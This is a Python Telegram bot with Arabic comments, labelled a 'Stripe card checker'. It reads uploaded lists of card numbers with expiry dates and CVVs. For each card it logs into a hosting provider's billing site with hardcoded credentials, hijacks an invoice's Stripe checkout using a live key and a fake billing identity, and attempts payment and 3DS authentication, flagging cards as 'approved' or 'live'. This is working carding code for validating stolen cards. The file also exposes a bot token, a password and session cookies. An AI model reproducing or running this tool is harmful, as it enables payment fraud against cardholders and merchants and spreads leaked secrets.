import os
import asyncio
import threading
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== الإعدادات ==========
BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
ADMIN_IDS = [5895491379]

INVOICE_ID = "260528"
USERNAME = "renes98352@neuraxo.com"
PASSWORD = "8AEBsC#3x5wZKs!"
LOGIN_PAGE_URL = "https://vsys.host/index.php?rp=/login"

cookies = {
    '_gcl_au': '1.1.1086970495.1761294272',
    'VsysFirstVisit': '1761307789',
    'WHMCSqCgI4rzA0cru': 'm1ehetmctequ9op73ccg4mfbnv',
    'WHMCSlogin_auth_tk': 'citwYWUwWFBwYTRzbG5xaUx2ZmNvRlJGOWtqcklzRkJxa09ab0RPVFhtTURiaXA2dER1ZEFrVU1xZG5Tc0pvRml3OXVUVjJUc0JRUjlzZm8rWmhSdmw3TUpSMGRFQXhKcU1UcmlXbEZQcFJPeUgxS3NYMll5R3Bwa0hIRXZXUFpqMVE3RGtsOTIzeXA5WW84TU1OR3N2b0JHbzEzUVBhd0pEUy80aDljSS80RkNJQys2YWczWEJSdERLa2txYnpHZkNZVVduUm8yZkRDdGFvV2ZCVXB3bVQ5TGd1UjJ2aC9tbEg5VkFrSjBBVkJiN20yME1Tc0p6bmhPY21KSy9LVFU4ZHU3cy9zczhIWFRoT2NlRndTa0EyOHpTVTluNVlQdUJPOWZrbWp0dmc5bUJkM2d1cm9pcy9TMGpOdmFqSUhlL1RSSlNiZ3FIRTBkODNvRUpsRUhSVzZkZ0pxWmIrQ08xZlU4aUFaeEkwWUx6VjRzWU13T3NMa3VkcnlJdHd6TjdlYVkvdXdWZ2x6Y0VOYXRJQlZqS0V4VkVCN0hNM2JIZ1RKOXVNPQ%3D%3D',
}

# ========== إحصائيات ==========
stats = {
    'total': 0,
    'checking': 0,
    'approved': 0,
    'live': 0,
    'declined': 0,
    'errors': 0,
    'start_time': None,
    'is_running': False,
    'dashboard_message_id': None,
    'chat_id': None,
    'current_cards': [],
    'session_renewals': 0,
    'last_renewal': None,
    'error_details': {},
}

session_error_count = 0
session_lock = threading.Lock()

# ========== دالات الفحص ==========
def do_login():
    global cookies
    try:
        print(f"🔄 محاولة تجديد الجلسة... ({datetime.now().strftime('%H:%M:%S')})")
        sess = requests.Session()
        sess.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        
        resp = sess.get(LOGIN_PAGE_URL, timeout=15, verify=False)
        soup = BeautifulSoup(resp.text, "html.parser")
        token_input = soup.find("input", {"name": "token"})
        token = token_input["value"] if token_input else ""
        
        post_data = {"token": token, "username": USERNAME, "password": PASSWORD, "rememberme": "on"}
        headers = {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://vsys.host", "Referer": LOGIN_PAGE_URL}
        
        login_resp = sess.post(LOGIN_PAGE_URL, data=post_data, headers=headers, timeout=15, verify=False)
        
        if "clientarea.php" in login_resp.url:
            cookies.update(sess.cookies.get_dict())
            stats['session_renewals'] += 1
            stats['last_renewal'] = datetime.now()
            print(f"✅ تم تجديد الجلسة بنجاح! (المرة #{stats['session_renewals']})")
            return True
        print("❌ فشل تجديد الجلسة - لم يتم التوجيه لـ clientarea")
        return False
    except Exception as e:
        print(f"❌ خطأ في تجديد الجلسة: {str(e)}")
        return False

def get_session_data():
    session = requests.Session()
    data = {'token': '771221946304082c891ac6c1542959d0e65da464', 'id': '31940'}
    try:
        session.post(f'https://vsys.host/index.php?rp=/invoice/{INVOICE_ID}/pay', data=data, cookies=cookies, verify=False, timeout=10)
    except:
        pass
    
    resp = session.get(f'https://vsys.host/viewinvoice.php?id={INVOICE_ID}', cookies=cookies, verify=False, timeout=10)
    m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', resp.text)
    if not m or '/pay/' not in m.group(0):
        return None, None, None
    
    session_id = m.group(0).split('/pay/')[1].split('#')[0]
    new_cookies = session.cookies.get_dict()
    stripe_mid = new_cookies.get('__stripe_mid', cookies.get('__stripe_mid'))
    stripe_sid = new_cookies.get('__stripe_sid', '')
    
    return session_id, stripe_mid, stripe_sid

async def check_card(card, bot_app):
    global session_error_count
    
    parts = card.strip().split('|')
    if len(parts) != 4:
        error_type = "FORMAT_ERROR"
        stats['errors'] += 1
        stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
        stats['checking'] -= 1
        await update_dashboard(bot_app)
        print(f"❌ {card[:20]}... - صيغة خاطئة")
        return card, error_type, "❌ صيغة خاطئة"
    
    cc, mm, yy, cvv = parts
    
    session_id, mid, sid = get_session_data()
    if not session_id:
        with session_lock:
            session_error_count += 1
            print(f"⚠️ خطأ Session #{session_error_count} - محاولة التجديد...")
            if session_error_count >= 3:
                if do_login():
                    print("✅ تم تجديد الجلسة بنجاح")
                    session_error_count = 0
                else:
                    print("❌ فشل تجديد الجلسة")
        
        error_type = "SESSION_ERROR"
        stats['errors'] += 1
        stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
        stats['checking'] -= 1
        await update_dashboard(bot_app)
        await send_result(bot_app, card, error_type, "فشل جلب Session")
        print(f"❌ {cc[:6]}****{cc[-4:]} - فشل جلب Session")
        return card, error_type, "فشل جلب Session"
    
    headers_api = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://checkout.stripe.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    
    pm_data = (
        f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&'
        'billing_details[name]=Mario+Rossi&billing_details[email]=mario.rossi%40gmail.com&'
        'billing_details[address][line1]=Via+Roma+123&billing_details[address][city]=Milano&'
        'billing_details[address][postal_code]=20121&'
        f'billing_details[address][country]=IT&muid={mid}'
    )
    
    if sid:
        pm_data += f'&sid={sid}'
    
    pm_data += (
        '&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
        f'client_attribution_metadata[checkout_session_id]={session_id}'
    )
    
    try:
        r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_api, data=pm_data, timeout=15)
        pm_res = r1.json()
        
        if 'error' in pm_res:
            error_msg = pm_res['error'].get('message', 'خطأ غير معروف')
            error_code = pm_res['error'].get('code', 'unknown')
            error_type = f"PM_{error_code}"
            
            stats['declined'] += 1
            stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
            stats['checking'] -= 1
            await update_dashboard(bot_app)
            await send_result(bot_app, card, "DECLINED", error_msg)
            print(f"❌ {cc[:6]}****{cc[-4:]} - {error_code}: {error_msg}")
            return card, "DECLINED", error_msg
        
        if 'id' not in pm_res:
            error_type = "PM_ERROR"
            stats['errors'] += 1
            stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
            stats['checking'] -= 1
            await update_dashboard(bot_app)
            await send_result(bot_app, card, error_type, "فشل إنشاء Payment Method")
            print(f"⚠️ {cc[:6]}****{cc[-4:]} - فشل إنشاء Payment Method")
            return card, error_type, "فشل إنشاء PM"
        
        pm_id = pm_res['id']
        confirm_data = f'payment_method={pm_id}&expected_amount=6800'
        if mid:
            confirm_data += f'&muid={mid}'
        if sid:
            confirm_data += f'&sid={sid}'
        confirm_data += f'&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
        
        r2 = requests.post(f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm', headers=headers_api, data=confirm_data, timeout=15)
        confirm_res = r2.json()
        
        if 'payment_intent' not in confirm_res:
            error_type = "PI_ERROR"
            error_msg = confirm_res.get('error', {}).get('message', 'لا يوجد Payment Intent')
            
            stats['errors'] += 1
            stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
            stats['checking'] -= 1
            await update_dashboard(bot_app)
            await send_result(bot_app, card, error_type, error_msg)
            print(f"⚠️ {cc[:6]}****{cc[-4:]} - {error_msg}")
            return card, error_type, error_msg
        
        pi = confirm_res['payment_intent']
        status = pi.get('status')
        
        if status == 'succeeded':
            stats['approved'] += 1
            stats['checking'] -= 1
            await update_dashboard(bot_app)
            await send_result(bot_app, card, "APPROVED", "Approved ✅")
            print(f"✅ {cc[:6]}****{cc[-4:]} - Approved!")
            return card, "APPROVED", "Approved"
        
        if status == 'requires_action':
            na = pi.get('next_action', {})
            if na.get('type') == 'use_stripe_sdk':
                source_id = na.get('use_stripe_sdk', {}).get('three_d_secure_2_source')
                if source_id:
                    tds_data = (
                        f'source={source_id}&'
                        'browser=%7B%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36%22%7D&'
                        'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
                    )
                    
                    r3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers_api, data=tds_data, timeout=15)
                    tds_res = r3.json()
                    
                    if 'error' in tds_res:
                        error_msg = tds_res['error'].get('message', 'خطأ 3DS')
                        error_type = "3DS_ERROR"
                        
                        stats['declined'] += 1
                        stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
                        stats['checking'] -= 1
                        await update_dashboard(bot_app)
                        await send_result(bot_app, card, error_type, error_msg)
                        print(f"❌ {cc[:6]}****{cc[-4:]} - 3DS Error: {error_msg}")
                        return card, error_type, error_msg
                    
                    trans = tds_res.get('ares', {}).get('transStatus') or tds_res.get('transStatus')
                    
                    if trans == 'Y':
                        stats['approved'] += 1
                        stats['checking'] -= 1
                        await update_dashboard(bot_app)
                        await send_result(bot_app, card, "APPROVED", "Approved (3DS) ✅")
                        print(f"✅ {cc[:6]}****{cc[-4:]} - Approved (3DS)!")
                        return card, "APPROVED", "Approved (3DS)"
                    elif trans == 'N':
                        stats['live'] += 1
                        stats['checking'] -= 1
                        await update_dashboard(bot_app)
                        await send_result(bot_app, card, "LIVE", "Live Card 🟢")
                        print(f"🟢 {cc[:6]}****{cc[-4:]} - Live Card!")
                        return card, "LIVE", "Live"
                    else:
                        stats['declined'] += 1
                        stats['error_details']['3DS_FAILED'] = stats['error_details'].get('3DS_FAILED', 0) + 1
                        stats['checking'] -= 1
                        await update_dashboard(bot_app)
                        await send_result(bot_app, card, "3DS_FAILED", f"3DS Status: {trans}")
                        print(f"⚠️ {cc[:6]}****{cc[-4:]} - 3DS Status: {trans}")
                        return card, "3DS_FAILED", f"3DS: {trans}"
        
        error = pi.get('last_payment_error', {})
        error_msg = error.get('message', error.get('code', status)) if error else status
        error_code = error.get('code', 'declined') if error else 'declined'
        
        stats['declined'] += 1
        stats['error_details'][error_code] = stats['error_details'].get(error_code, 0) + 1
        stats['checking'] -= 1
        await update_dashboard(bot_app)
        await send_result(bot_app, card, "DECLINED", error_msg)
        print(f"❌ {cc[:6]}****{cc[-4:]} - {error_code}: {error_msg}")
        return card, "DECLINED", error_msg
        
    except Exception as e:
        error_type = "EXCEPTION"
        stats['errors'] += 1
        stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
        stats['checking'] -= 1
        await update_dashboard(bot_app)
        await send_result(bot_app, card, error_type, str(e))
        print(f"💥 {cc[:6]}****{cc[-4:]} - Exception: {str(e)}")
        return card, error_type, str(e)

# ========== دالات البوت ==========
async def send_result(bot_app, card, status_type, message):
    """إرسال نتيجة الفحص كزر"""
    if not stats['chat_id']:
        return
    
    emoji_map = {
        'APPROVED': '✅',
        'LIVE': '🟢',
        'DECLINED': '❌',
        'SESSION_ERROR': '🔴',
        'PM_ERROR': '⚠️',
        'PI_ERROR': '⚠️',
        '3DS_ERROR': '🔶',
        '3DS_FAILED': '🔶',
        'FORMAT_ERROR': '❌',
        'EXCEPTION': '⚠️'
    }
    
    emoji = emoji_map.get(status_type, '❓')
    
    parts = card.split('|')
    cc = parts[0] if len(parts) > 0 else "****"
    masked = f"{cc[:6]}******{cc[-4:]}"
    
    keyboard = [
        [InlineKeyboardButton(f"💳 {masked}", callback_data="card_info")],
        [InlineKeyboardButton(f"{emoji} {message[:35]}", callback_data="response_info")],
        [InlineKeyboardButton(f"⏰ {datetime.now().strftime('%H:%M:%S')}", callback_data="time_info")]
    ]
    
    if status_type in ['APPROVED', 'LIVE']:
        try:
            await bot_app.bot.send_message(
                chat_id=stats['chat_id'],
                text=f"🎉 **HIT FOUND!**",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
        except:
            pass

def create_dashboard_keyboard():
    """إنشاء أزرار Dashboard"""
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    keyboard = [
        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
        [
            InlineKeyboardButton(f"🔄 يتم الفحص: {stats['checking']}", callback_data="checking"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
        ],
        [
            InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data="approved"),
            InlineKeyboardButton(f"🟢 Live: {stats['live']}", callback_data="live")
        ],
        [
            InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="declined"),
            InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")
        ],
        [
            InlineKeyboardButton(f"🔄 تجديدات الجلسة: {stats['session_renewals']}", callback_data="renewals")
        ]
    ]
    
    if stats['last_renewal']:
        time_diff = (datetime.now() - stats['last_renewal']).seconds
        keyboard.append([
            InlineKeyboardButton(f"⏰ آخر تجديد: منذ {time_diff}ث", callback_data="last_renewal")
        ])
    
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
    
    if stats['current_cards']:
        keyboard.append([InlineKeyboardButton("━━━ البطاقات الحالية ━━━", callback_data="separator")])
        for i, card_info in enumerate(stats['current_cards'][:3]):
            keyboard.append([InlineKeyboardButton(f"🔄 {card_info}", callback_data=f"card_{i}")])
    
    if stats['error_details']:
        keyboard.append([InlineKeyboardButton("━━━ أكثر الأخطاء ━━━", callback_data="error_sep")])
        sorted_errors = sorted(stats['error_details'].items(), key=lambda x: x[1], reverse=True)[:3]
        for error_type, count in sorted_errors:
            keyboard.append([InlineKeyboardButton(f"⚠️ {error_type}: {count}", callback_data=f"err_{error_type}")])
    
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app):
    """تحديث Dashboard"""
    if stats['dashboard_message_id'] and stats['chat_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=stats['chat_id'],
                message_id=stats['dashboard_message_id'],
                text="📊 **STRIPE CARD CHECKER** 📊",
                reply_markup=create_dashboard_keyboard(),
                parse_mode='Markdown'
            )
        except:
            pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح")
        return
    
    keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
    await update.message.reply_text(
        "📊 **STRIPE CARD CHECKER BOT**\n\n"
        "أرسل ملف .txt يحتوي على البطاقات\n"
        "الصيغة: `رقم|شهر|سنة|cvv`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ يوجد فحص جاري!")
        return
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
    
    stats['total'] = len(cards)
    stats['checking'] = 0
    stats['approved'] = 0
    stats['live'] = 0
    stats['declined'] = 0
    stats['errors'] = 0
    stats['current_cards'] = []
    stats['session_renewals'] = 0
    stats['last_renewal'] = None
    stats['error_details'] = {}
    stats['start_time'] = datetime.now()
    stats['is_running'] = True
    stats['chat_id'] = update.effective_chat.id
    
    dashboard_msg = await update.message.reply_text(
        "📊 **STRIPE CARD CHECKER** 📊",
        reply_markup=create_dashboard_keyboard(),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    def run_checker():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(process_cards(cards, context.application))
        loop.close()
    
    threading.Thread(target=run_checker, daemon=True).start()

async def process_cards(cards, bot_app):
    for i in range(0, len(cards), 3):
        if not stats['is_running']:
            break
        
        batch = cards[i:i+3]
        stats['checking'] = len(batch)
        stats['current_cards'] = [f"{c.split('|')[0][:6]}****{c.split('|')[0][-4:]}" for c in batch if '|' in c]
        await update_dashboard(bot_app)
        
        tasks = [check_card(card, bot_app) for card in batch]
        await asyncio.gather(*tasks)
        
        if i + 3 < len(cards):
            await asyncio.sleep(3)
    
    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_cards'] = []
    await update_dashboard(bot_app)
    
    if stats['chat_id']:
        keyboard = [
            [InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data="final_approved")],
            [InlineKeyboardButton(f"🟢 Live: {stats['live']}", callback_data="final_live")],
            [InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="final_declined")],
            [InlineKeyboardButton(f"🔥 Total: {stats['total']}", callback_data="final_total")],
            [InlineKeyboardButton(f"🔄 تجديدات: {stats['session_renewals']}", callback_data="final_renewals")]
        ]
        await bot_app.bot.send_message(
            chat_id=stats['chat_id'],
            text="✅ **اكتمل الفحص!**",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "stop_check":
        stats['is_running'] = False
        await update_dashboard(context.application)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("🤖 البوت يعمل...")
    app.run_polling()

if __name__ == "__main__":
    main()
